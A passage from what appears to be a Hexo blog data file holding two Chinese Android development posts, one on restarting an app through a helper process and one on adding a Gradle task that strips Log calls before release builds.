class=\"line\">            finish()</span><br><span class=\"line\">            killProcess()</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">suspend</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">doubleCheckMainProcess</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">        delay(<span class=\"number\">1500L</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isMainProcessAlive(<span class=\"keyword\">this</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">val</span> mainPid = intent.getIntExtra(EXTRA_MAIN_PID, <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mainPid != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                killProcess(mainPid)</span><br><span class=\"line\">                delay(<span class=\"number\">1500L</span>)</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>整个代码非常简单，只要搞清楚 <code>killProcess</code> 方法哪些时候是kill的哪个进程，就理解了。在任意一个需要重启当前进程（可以不只是主进程）的地方，调用：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">KillerActivity.launch(<span class=\"keyword\">this</span>)</span><br></pre></td></tr></table></figure>\n\n<p>即可。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>你可能会好奇，有些手游（比如王者荣耀）是怎么实现资源更新后自动重启的？</p>\n<p>这个体验确实不错，因为不需要用户手动点击桌面图标重启App，在一些数据恢复备份的场景中，很实用。比如，从云端拉取SQLite数据库db文件或一些prefs配置文件后，会直接覆盖到本地，但进程不重新启动的话，是不会生效的。</p>\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><p>基本思路其实很简单，利用Android应用对多进程的天然支持，来实现双进程互拉。</p>\n<blockquote>\n<p>有的朋友一看见“双进程”、“互拉”这些词汇就会立马联想到保活，注意本文不是讲保活的哦。</p>\n</blockquote>\n<p>为了方便讲解，我们定义主进程之外的另一个进程为 <strong>进程B</strong>。大致流程分这么几步：</p>\n<ul>\n<li>在主进程执行完一系列业务逻辑后，欲重启，先拉起进程B</li>\n<li>进程B启动后，主进程kill掉自己</li>\n<li>接着，进程B拉起主进程，然后再kill掉自己，此时主进程完成自动重启</li>\n</ul>\n<h3 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h3><p>先在Manifest中声明进程B，为了良好的交互体验，需要实现一个Activity，进程名称自定义，比如此处叫“killer”，是不是很贴切？</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.KillerActivity&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:exported</span>=<span class=\"string\">&quot;false&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:launchMode</span>=<span class=\"string\">&quot;singleTask&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:process</span>=<span class=\"string\">&quot;:killer&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>关键实现来了：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">KillerActivity</span> : <span class=\"type\">FragmentActivity</span>() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">companion</span> <span class=\"keyword\">object</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"keyword\">const</span> <span class=\"keyword\">val</span> EXTRA_MAIN_PID = <span class=\"string\">&quot;extra_main_pid&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 当主进程需要重启时，就直接调用此方法启动KillerActivity</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">launch</span><span class=\"params\">(activity: <span class=\"type\">FragmentActivity</span>)</span></span> &#123;</span><br><span class=\"line\">            activity.startActivity(</span><br><span class=\"line\">                Intent(activity, KillerActivity::<span class=\"keyword\">class</span>.java).apply &#123;</span><br><span class=\"line\">                    putExtra(EXTRA_MAIN_PID, Process.myPid())</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            )</span><br><span class=\"line\">            activity.finish() <span class=\"comment\">// 主进程的Activity先关闭</span></span><br><span class=\"line\">            GlobalScope.launch &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 稍作延迟后，主进程kill掉自己</span></span><br><span class=\"line\">                delay(<span class=\"number\">500L</span>)</span><br><span class=\"line\">                killProcess()</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">killProcess</span><span class=\"params\">(pid: <span class=\"type\">Int</span> = Process.myPid()</span></span>) &#123;</span><br><span class=\"line\">            Process.killProcess(pid)</span><br><span class=\"line\">            exitProcess(<span class=\"number\">0</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">isMainProcessAlive</span><span class=\"params\">(context: <span class=\"type\">Context</span>)</span></span>: <span class=\"built_in\">Boolean</span> = runCatching &#123;</span><br><span class=\"line\">            (context.getSystemService(Context.ACTIVITY_SERVICE) <span class=\"keyword\">as</span> ActivityManager)</span><br><span class=\"line\">                .runningAppProcesses.find &#123; it.processName == context.packageName &#125; != <span class=\"literal\">null</span></span><br><span class=\"line\">        &#125;.getOrDefault(<span class=\"literal\">false</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">override</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">onCreate</span><span class=\"params\">(savedInstanceState: <span class=\"type\">Bundle</span>?)</span></span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.onCreate(savedInstanceState)</span><br><span class=\"line\">        lifecycleScope.launch &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 此处可以插入一些Loading的UI显示，比如ProgressDialog之类的</span></span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// 二次检查，防止主进程没杀掉</span></span><br><span class=\"line\">            doubleCheckMainProcess()</span><br><span class=\"line\">            <span class=\"comment\">// 稍作等待后，再次启动主进程的Activity</span></span><br><span class=\"line\">            startActivity(Intent(<span class=\"keyword\">this</span>, MainActivity::<span class=\"keyword\">class</span>.java).apply &#123;</span><br><span class=\"line\">                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK)</span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// 进程B的KillerActivity先关闭，再kill掉自己</span></span><br><span class=\"line\">            finish()</span><br><span class=\"line\">            killProcess()</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">suspend</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">doubleCheckMainProcess</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">        delay(<span class=\"number\">1500L</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isMainProcessAlive(<span class=\"keyword\">this</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">val</span> mainPid = intent.getIntExtra(EXTRA_MAIN_PID, <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mainPid != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                killProcess(mainPid)</span><br><span class=\"line\">                delay(<span class=\"number\">1500L</span>)</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>整个代码非常简单，只要搞清楚 <code>killProcess</code> 方法哪些时候是kill的哪个进程，就理解了。在任意一个需要重启当前进程（可以不只是主进程）的地方，调用：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">KillerActivity.launch(<span class=\"keyword\">this</span>)</span><br></pre></td></tr></table></figure>\n\n<p>即可。</p>\n"},{"title":"在assembleRelease之前执行自定义任务","date":"2024-03-25T06:19:04.000Z","_content":"\n### 背景\n\n在实际的Gradle项目开发中，我们总是会遇到一些需求，要在release编译的时候执行一些任务，但debug时不需要。然而，Gradle编译有自己的一套生命周期，比如Android项目的assembleRelease任务在编译启动之前是没有办法静态获取到的。\n\n下面我们就以“去除release版本中的logcat日志打印”为例，做一个简单的梳理。\n\n### 源码\n\n修改模板（module）级别的 `build.gradle.kts` 文件，我们初步目标是在编译刚启动但还没实际开始执行任务时插入我们的自定义任务，切入点就是Gradle的preBuild任务，这个是预定义的，所以可以进行静态配置：\n\n```kotlin\nplugins {\n    id(\"com.android.application\")\n    id(\"kotlin-android\")\n    id(\"kotlin-kapt\")\n}\n\nandroid {\n    namespace = \"com.xxx.yyy\"\n    compileSdk = 34\n\n    // ...\n}\n\ndependencies {\n    // ...\n}\n\n// 重点部分\ntasks {\n    preBuild {\n        // 编译启动后，相关任务会动态生成，于是可以获取到\n        val isAssembleRelease = gradle.startParameter.taskNames.any {\n            it.contains(\"assembleRelease\")\n        }\n        if (isAssembleRelease) {\n            // 做一些release编译才做的事\n        }\n    }\n}\n```\n\n以上可以说就是一个基础模板代码。此外，我们还可以添加本地配置来控制编译任务的开关，在项目（project）级别目录下添加 `local.properties` 文件，注意这个文件不要添加到git索引中，只是一个本地文件，一般来说项目拉取到本地的时候IDE（如Android Studio）会自动生成此文件：\n\n```\n## This file must *NOT* be checked into Version Control Systems,\n# as it contains information specific to your local configuration.\n#\n# Location of the SDK. This is only used by Gradle.\n# For customization when using a Version Control System, please read the\n# header note.\n#Wed Oct 25 11:29:50 CST 2023\nsdk.dir=/Users/xxx/Library/Android/sdk\n\n# 增加一个自定义的属性，等会儿使用\nBUILD_FOR_RELEASE=true\n```\n\n回去修改模板代码，这样就可以在不需要的时候，关闭自定义任务的执行：\n\n```kotlin\n// kts文件头部需要import此类\nimport java.util.Properties\n\n// ...\n\ntasks {\n    preBuild {\n        val isAssembleRelease = gradle.startParameter.taskNames.any {\n            // 把app bundle编译也考虑进去\n            it.contains(\"bundleRelease\") || it.contains(\"assembleRelease\")\n        }\n        val localPropsFile = File(project.rootDir, \"local.properties\")\n        val localProps = localPropsFile.takeIf { it.exists() }?.let {\n            Properties().apply { localPropsFile.inputStream().use { input -> load(input) } }\n        }\n        val toggle = localProps?.getProperty(\"BUILD_FOR_RELEASE\")?.toBoolean() ?: true\n        if (isAssembleRelease && toggle) {\n            // 做一些release编译才做的事\n        }\n    }\n}\n```\n\n接下来，我们开始自定义task，去除release版本中的logcat日志打印：\n\n```kotlin\ntasks {\n    val removeLogs by registering {\n        group = \"你可以随意定义分组名字，方便在Gradle任务列表中快速查找\"\n        doLast {\n            val srcDir = File(project.rootDir, \"app/src/main/java\")\n            srcDir.walkTopDown().filter {\n                it.isFile && it.extension == \"kt\"\n            }.forEach {\n                val content = it.readText()\n                it.writeText(\n                    content.replace(\"import android.util.Log\", \"\")\n                        .replace(\"Log.\", \"// Log.\")\n                )\n            }\n        }\n    }\n}\n```\n\n这个任务只是个例子，很简单，目的就是搜寻源码目录下所有的kt文件，然后把logcat相关的代码注释掉。这样可以有效防止被反编译后泄露敏感字符串，当然你可以根据自己的需求随意去修改文件内容。\n\n自定义之后，就是最后一步了，把任务插入添加到Gradle的编译任务链中，主要使用 `dependsOn` 方法，让preBuild任务依赖于我们的自定义任务：\n\n```kotlin\ntasks {\n    val removeLogs by registering {\n        // ...\n    }\n\n    preBuild {\n        // ...\n        if (isAssembleRelease && toggle) {\n            dependsOn(\"removeLogs\")\n        }\n    }\n}\n```\n\n`dependsOn` 方法还接受多个参数，比如上述若改成 `dependsOn(\"task1\", \"task2\", \"task3\")`，那么在preBuild之前就将按序依次执行这3个task。 \n\n记得进行Gradle Sync操作，再启动assembleRelease编译，就可以在构建输出中看到我们自定义的任务了：\n\n```\nExecuting tasks: [:app:assembleRelease] in project /Users/xxx/xxx/xxx\n\nStarting Gradle Daemon...\nGradle Daemon started in 1 s 244 ms\n\n> Configure project :app\n\n> Task :app:createReleaseVariantModel UP-TO-DATE\n> Task :app:removeLogs\n> Task :app:preBuild\n> Task :app:preReleaseBuild\n```\n\n可以看到，createReleaseVariantModel这个预定义的任务其实就是在动态生成assembleRelease，然后removeLogs在preBuild的前面，这样就能保证在代码优化和混淆开始之前，对源码进行自定义修改。\n\n### 补充\n\n对于大多数项目来说，都是有git管理的，所以在我们刚才对源码进行修改之后，其实并不想提交这些修改，而是想在编译完成后撤销修改。那么，我们就可以继续优化上述代码，在assembleRelease完成之后执行简单的git命令：\n\n```kotlin\ntasks {\n    val removeLogs by registering {\n        // ...\n    }\n\n    // 我们可以写一个方法，方便复用\n    fun execGitRollbackAndCleanSrc() {\n        exec { commandLine(\"git\", \"checkout\", \"src\") }\n        exec { commandLine(\"git\", \"clean\", \"-fd\", \"src\") }\n    }\n    \n    preBuild {\n        // ...\n        if (isAssembleRelease && toggle) {\n            dependsOn(\"removeLogs\")\n            doLast {\n                findByName(\"bundleRelease\")?.doLast { execGitRollbackAndCleanSrc() }\n                findByName(\"assembleRelease\")?.doLast { execGitRollbackAndCleanSrc() }\n            }\n        }\n    }\n}\n```\n\n和 `dependsOn` 类似，`doLast` 也是调整任务链的有效方法之一，即在preBuild执行完成时，动态地给assembleRelease添加一个任务，使得assembleRelease在执行完成时，再执行我们的方法。\n\n### 后话\n\n上述代码都是一些简单的Gradle脚本，专用于自己项目的一些编译优化，进行大量实践后，完全可以开发成Gradle插件来使用，关键代码都是差不多的，需要的只是熟读Gradle官方文档，了解整个编译构建流程。\n","source":"_posts/2024-03-25-在assembleRelease之前执行自定义任务.md","raw":"---\ntitle: 在assembleRelease之前执行自定义任务\ndate: 2024-03-25 14:19:04\ntags:\n  - Gradle\n  - Kotlin\n  - Android\n---\n\n### 背景\n\n在实际的Gradle项目开发中，我们总是会遇到一些需求，要在release编译的时候执行一些任务，但debug时不需要。然而，Gradle编译有自己的一套生命周期，比如Android项目的assembleRelease任务在编译启动之前是没有办法静态获取到的。\n\n下面我们就以“去除release版本中的logcat日志打印”为例，做一个简单的梳理。\n\n### 源码\n\n修改模板（module）级别的 `build.gradle.kts` 文件，我们初步目标是在编译刚启动但还没实际开始执行任务时插入我们的自定义任务，切入点就是Gradle的preBuild任务，这个是预定义的，所以可以进行静态配置：\n\n```kotlin\nplugins {\n    id(\"com.android.application\")\n    id(\"kotlin-android\")\n    id(\"kotlin-kapt\")\n}\n\nandroid {\n    namespace = \"com.xxx.yyy\"\n    compileSdk = 34\n\n    // ...\n}\n\ndependencies {\n    // ...\n}\n\n// 重点部分\ntasks {\n    preBuild {\n        // 编译启动后，相关任务会动态生成，于是可以获取到\n        val isAssembleRelease = gradle.startParameter.taskNames.any {\n            it.contains(\"assembleRelease\")\n        }\n        if (isAssembleRelease) {\n            // 做一些release编译才做的事\n        }\n    }\n}\n```\n\n以上可以说就是一个基础模板代码。此外，我们还可以添加本地配置来控制编译任务的开关，在项目（project）级别目录下添加 `local.properties` 文件，注意这个文件不要添加到git索引中，只是一个本地文件，一般来说项目拉取到本地的时候IDE（如Android Studio）会自动生成此文件：\n\n```\n## This file must *NOT* be checked into Version Control Systems,\n# as it contains information specific to your local configuration.\n#\n# Location of the SDK. This is only used by Gradle.\n# For customization when using a Version Control System, please read the\n# header note.\n#Wed Oct 25 11:29:50 CST 2023\nsdk.dir=/Users/xxx/Library/Android/sdk\n\n# 增加一个自定义的属性，等会儿使用\nBUILD_FOR_RELEASE=true\n```\n\n回去修改模板代码，这样就可以在不需要的时候，关闭自定义任务的执行：\n\n```kotlin\n// kts文件头部需要import此类\nimport java.util.Properties\n\n// ...\n\ntasks {\n    preBuild {\n        val isAssembleRelease = gradle.startParameter.taskNames.any {\n            // 把app bundle编译也考虑进去\n            it.contains(\"bundleRelease\") || it.contains(\"assembleRelease\")\n        }\n        val localPropsFile = File(project.rootDir, \"local.properties\")\n        val localProps = localPropsFile.takeIf { it.exists() }?.let {\n            Properties().apply { localPropsFile.inputStream().use { input -> load(input) } }\n        }\n        val toggle = localProps?.getProperty(\"BUILD_FOR_RELEASE\")?.toBoolean() ?: true\n        if (isAssembleRelease && toggle) {\n            // 做一些release编译才做的事\n        }\n    }\n}\n```\n\n接下来，我们开始自定义task，去除release版本中的logcat日志打印：\n\n```kotlin\ntasks {\n    val removeLogs by registering {\n        group = \"你可以随意定义分组名字，方便在Gradle任务列表中快速查找\"\n        doLast {\n            val srcDir = File(project.rootDir, \"app/src/main/java\")\n            srcDir.walkTopDown().filter {\n                it.isFile && it.extension == \"kt\"\n            }.forEach {\n                val content = it.readText()\n                it.writeText(\n                    content.replace(\"import android.util.Log\", \"\")\n                        .replace(\"Log.\", \"// Log.\")\n                )\n            }\n        }\n    }\n}\n```\n\n这个任务只是个例子，很简单，目的就是搜寻源码目录下所有的kt文件，然后把logcat相关的代码注释掉。这样可以有效防止被反编译后泄露敏感字符串，当然你可以根据自己的需求随意去修改文件内容。\n\n自定义之后，就是最后一步了，把任务插入添加到Gradle的编译任务链中，主要使用 `dependsOn` 方法，让preBuild任务依赖于我们的自定义任务：\n\n```kotlin\ntasks {\n    val removeLogs by registering {\n        // ...\n    }\n\n    preBuild {\n        // ...\n        if (isAssembleRelease && toggle) {\n            dependsOn(\"removeLogs\")\n        }\n    }\n}\n```\n\n`dependsOn` 方法还接受多个参数，比如上述若改成 `dependsOn(\"task1\", \"task2\", \"task3\")`，那么在preBuild之前就将按序依次执行这3个task。 \n\n记得进行Gradle Sync操作，再启动assembleRelease编译，就可以在构建输出中看到我们自定义的任务了：\n\n```\nExecuting tasks: [:app:assembleRelease] in project /Users/xxx/xxx/xxx\n\nStarting Gradle Daemon...\nGradle Daemon started in 1 s 244 ms\n\n> Configure project :app\n\n> Task :app:createReleaseVariantModel UP-TO-DATE\n> Task :app:removeLogs\n> Task :app:preBuild\n> Task :app:preReleaseBuild\n```\n\n可以看到，createReleaseVariantModel这个预定义的任务其实就是在动态生成assembleRelease，然后removeLogs在preBuild的前面，这样就能保证在代码优化和混淆开始之前，对源码进行自定义修改。\n\n### 补充\n\n对于大多数项目来说，都是有git管理的，所以在我们刚才对源码进行修改之后，其实并不想提交这些修改，而是想在编译完成后撤销修改。那么，我们就可以继续优化上述代码，在assembleRelease完成之后执行简单的git命令：\n\n```kotlin\ntasks {\n    val removeLogs by registering {\n        // ...\n    }\n\n    // 我们可以写一个方法，方便复用\n    fun execGitRollbackAndCleanSrc() {\n        exec { commandLine(\"git\", \"checkout\", \"src\") }\n        exec { commandLine(\"git\", \"clean\", \"-fd\", \"src\") }\n    }\n    \n    preBuild {\n        // ...\n        if (isAssembleRelease && toggle) {\n            dependsOn(\"removeLogs\")\n            doLast {\n                findByName(\"bundleRelease\")?.doLast { execGitRollbackAndCleanSrc() }\n                findByName(\"assembleRelease\")?.doLast { execGitRollbackAndCleanSrc() }\n            }\n        }\n    }\n}\n```\n\n和 `dependsOn` 类似，`doLast` 也是调整任务链的有效方法之一，即在preBuild执行完成时，动态地给assembleRelease添加一个任务，使得assembleRelease在执行完成时，再执行我们的方法。\n\n### 后话\n\n上述代码都是一些简单的Gradle脚本，专用于自己项目的一些编译优化，进行大量实践后，完全可以开发成Gradle插件来使用，关键代码都是差不多的，需要的只是熟读Gradle官方文档，了解整个编译构建流程。\n","slug":"在assembleRelease之前执行自定义任务","published":1,"updated":"2024-03-28T06:17:56.457Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cluaufh1r005nthe6dg2adzb1","content":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>在实际的Gradle项目开发中，我们总是会遇到一些需求，要在release编译的时候执行一些任务，但debug时不需要。然而，Gradle编译有自己的一套生命周期，比如Android项目的assembleRelease任务在编译启动之前是没有办法静态获取到的。</p>\n<p>下面我们就以“去除release版本中的logcat日志打印”为例，做一个简单的梳理。</p>\n<h3 id=\"源码\"><a href=\"#源码\" class=\"headerlink\" title=\"源码\"></a>源码</h3><p>修改模板（module）级别的 <code>build.gradle.kts</code> 文件，我们初步目标是在编译刚启动但还没实际开始执行任务时插入我们的自定义任务，切入点就是Gradle的preBuild任务，这个是预定义的，所以可以进行静态配置：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">plugins &#123;</span><br><span class=\"line\">    id(<span class=\"string\">&quot;com.android.application&quot;</span>)</span><br><span class=\"line\">    id(<span class=\"string\">&quot;kotlin-android&quot;</span>)</span><br><span class=\"line\">    id(<span class=\"string\">&quot;kotlin-kapt&quot;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">android &#123;</span><br><span class=\"line\">    namespace = <span class=\"string\">&quot;com.xxx.yyy&quot;</span></span><br><span class=\"line\">    compileSdk = <span class=\"number\">34</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dependencies &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 重点部分</span></span><br><span class=\"line\">tasks &#123;</span><br><span class=\"line\">    preBuild &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 编译启动后，相关任务会动态生成，于是可以获取到</span></span><br><span class=\"line\">        <span class=\"keyword\">val</span> isAssembleRelease = gradle.startParameter.taskNames.any &#123;</span><br><span class=\"line\">            it.contains(<span class=\"string\">&quot;assembleRelease&quot;</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isAssembleRelease) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 做一些release编译才做的事</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>以上可以说就是一个基础模板代码。此外，我们还可以添加本地配置来控制编译任务的开关，在项目（project）级别目录下添加 <code>local.properties</code> 文件，注意这个文件不要添加到git索引中，只是一个本地文件，一般来说项目拉取到本地的时候IDE（如Android Studio）会自动生成此文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## This file must *NOT* be checked into Version Control Systems,</span><br><span class=\"line\"># as it contains information specific to your local configuration.</span><br><span class=\"line\">#</span><br><span class=\"line\"># Location of the SDK. This is only used by Gradle.</span><br><span class=\"line\"># For customization when using a Version Control System, please read the</span><br><span class=\"line\"># header note.</span><br><span class=\"line\">#Wed Oct 25 11:29:50 CST 2023</span><br><span class=\"line\">sdk.dir=/Users/xxx/Library/Android/sdk</span><br><span class=\"line\"></span><br><span class=\"line\"># 增加一个自定义的属性，等会儿使用</span><br><span class=\"line\">BUILD_FOR_RELEASE=true</span><br></pre></td></tr></table></figure>\n\n<p>回去修改模板代码，这样就可以在不需要的时候，关闭自定义任务的执行：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// kts文件头部需要import此类</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Properties</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">tasks &#123;</span><br><span class=\"line\">    preBuild &#123;</span><br><span class=\"line\">        <span class=\"keyword\">val</span> isAssembleRelease = gradle.startParameter.taskNames.any &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 把app bundle编译也考虑进去</span></span><br><span class=\"line\">            it.contains(<span class=\"string\">&quot;bundleRelease&quot;</span>) || it.contains(<span class=\"string\">&quot;assembleRelease&quot;</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">val</span> localPropsFile = File(project.rootDir, <span class=\"string\">&quot;local.properties&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">val</span> localProps = localPropsFile.takeIf &#123; it.exists() &#125;?.let &#123;</span><br><span class=\"line\">            Properties().apply &#123; localPropsFile.inputStream().use &#123; input -&gt; load(input) &#125; &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">val</span> toggle = localProps?.getProperty(<span class=\"string\">&quot;BUILD_FOR_RELEASE&quot;</span>)?.toBoolean() ?: <span class=\"literal\">true</span></span><br><span class=\"line\">        <span 